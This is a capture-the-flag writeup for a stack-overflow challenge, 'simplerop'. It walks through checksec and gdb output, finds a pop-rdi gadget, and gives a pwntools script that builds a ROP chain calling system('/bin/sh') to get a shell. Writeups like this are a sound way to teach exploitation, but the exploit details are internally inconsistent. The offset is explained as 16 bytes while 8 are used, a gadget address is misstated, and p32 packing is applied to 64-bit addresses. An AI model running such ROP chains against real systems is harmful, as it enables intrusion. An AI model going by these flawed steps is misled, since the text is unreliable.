# See for Yourself 'simplerop' Writeup

This challenge is another short program that reads one line of input.

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

char * binsh = "/bin/sh";

int main() {
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
    system(NULL);

    char * shellcode[0];

    printf("Unfortunately, no one can be told what the Matrix is. You have to see it for yourself.\n");
    read(0, shellcode, 64);
}
```

We can run `checksec` to see what protections the program is compiled with.

```
━━┫ checksec simplerop                  
[*] '/home/simplerop/simplerop'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Noteably, the stack is not executable, but there is no stack canary and PIE is disabled. This means that a ROP (Return Oriented Programming) attack should be feasible.

First, we will attempt to gain control of the stack pointer to determine the correct offset. This can be done with pwntool's `cyclic`, manually in `gdb`, or statically by reading the offsets in the disassembly. This is how it can be done in gdb:

```
gef➤  r
Starting program: /home/simplerop/simplerop 
[Detaching after vfork from child process 15189]
Unfortunately, no one can be told what the Matrix is. You have to see it for yourself.
AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401208 in main () at simplerop.c:16
16      simplerop.c: No such file or directory.
gef➤  x/xi $rip
=> 0x401208 <main+114>: ret    
gef➤  x/xg $rsp
0x7fffffffbaa8: 0x4242424242424242
```

We see that `0x4242424242424242` is where the program is trying (and failing) to return to. Since `0x43`is `C`, this means that 16 bytes past the start of our input is where our ROP chain should start.

A ROP attack involves overwriting the return address of a function on the stack to a 'gadget' that will perform some simple action, then return. You can set the return address of that gadget to another simple action, and so forth until you combine enough simple actions to gain a shell.

In our case, jumping to code that will call `system`, after setting up the arguments (`rdi = "/bin/sh"`) is a simple solution. since "/bin/sh" exists in the data section and `system` is called by the program.

In order to do so, our ROP chain should look something like:

```
pop rdi; ret
<ptr to "/bin/sh">
call system
```

We can use ROPgadget to find the first gadget ('pop rdi'), gdb to find "/bin/sh", and the disassembly of main to find `call system`.

```
━━┫ ROPgadget --binary simplerop | grep 'pop rdi'
0x0000000000401273 : pop rdi ; ret
```

```
gef➤  p (char *) binsh
$1 = 0x402008 "/bin/sh"
```

```
gef➤  disassemble main
Dump of assembler code for function main:
   ...

   0x00000000004011da <+68>:    mov    edi,0x0
   0x00000000004011df <+73>:    call   0x401080 <system@plt>
   0x00000000004011e4 <+78>:    lea    rdi,[rip+0xe25]        # 0x402010
   ...
```

This means that: `pop rdi` is at `0x401283`, `"/bin/sh"` is at `0x402008`, and `call system` is at `0x4011df`.

Our ropchain should then look like:

```
ropchain = b''
ropchain += p32(0x401273)
ropchain += p32(0x402008)
ropchain += p32(0x4011df)
```

We can use the offset that we calculated earlier to send the payload:

```
p.sendline(b'A' * 8 + ropchain)
```

In addition, pwntools has some additional features to help build ropchains. Here is an example of a solve that takes advantage of the automatic generation of a call:
```
from pwn import *

# This is required to ensure the right ropchain is generated
context.arch = 'amd64'

p = process("./simplerop")
binary = ELF("./simplerop")

rop = ROP(binary)
binsh = 0x402008
system = 0x4011df
rop.call(system, [binsh])

print(rop.dump())

p.sendline(b'A' * 8 + rop.chain())
p.interactive()
```

